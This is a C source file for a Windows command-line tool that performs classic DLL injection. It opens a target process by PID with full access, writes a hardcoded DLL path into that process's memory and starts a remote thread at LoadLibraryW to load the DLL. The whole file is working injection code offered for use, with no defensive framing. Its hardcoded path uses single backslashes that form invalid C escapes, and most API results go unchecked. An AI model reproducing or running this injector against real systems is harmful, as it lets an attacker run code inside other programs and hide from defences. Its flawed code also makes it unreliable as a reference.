#include "glassBox.h"

PVOID rBuffer;
HANDLE hProcess;
wchar_t dllLocation[MAX_PATH] = L"C:\Users\Niko Bellic\Desktop\Tools\DLL Injection\example.dll";

int main(int argc, char* argv[]) {

    if (argc < 2) {
        printf("%s usage: dll.exe <pid>", er);
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);

    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID);

    if (!hProcess || hProcess == NULL) {
        printf("%s could not create handle to process [%d]", er, PID);
        return EXIT_FAILURE;
    }

    printf("%s created handle to process [%d]\n", ok, PID);
    printf("%s allocating memory within process...\n", in);

    rBuffer = VirtualAllocEx(hProcess,
        rBuffer,
        sizeof(dllLocation),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    printf("%s allocated space within process\n\n", ok);
    printf("\t%s VirtualAllocEx() [flProtect -> PAGE_READWRITE]\n", in);
    printf("\t%s VirtualAllocEx() [flAllocationType -> MEM_COMMIT | MEM_RESERVE]\n\n", in);
    printf("%s writing to process memory...\n", in);

    WriteProcessMemory(hProcess,
        rBuffer,
        (LPVOID)dllLocation,
        sizeof(dllLocation),
        NULL);

    printf("%s wrote to process memory\n\n", ok);
    printf("\t%s getting library [LoadLibraryW() -> Kernel32] address...\n", in);
    printf("\t%s starting PTHREAD_START_ROUTINE...\n\n", in);

    PTHREAD_START_ROUTINE startRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

    printf("%s PTHREAD_START_ROUTINE done, loading library address done\n", ok);
    printf("%s creating remote thread...\n", in);

    CreateRemoteThread(hProcess,
        NULL,
        0,
        startRoutine,
        rBuffer,
        0,
        NULL);

    printf("%s thread created, enjoy!\n", ok);
    printf("%s closing handle to process...\n", in);

    CloseHandle(hProcess);

    printf("%s finished", ok);

    return EXIT_SUCCESS;
}
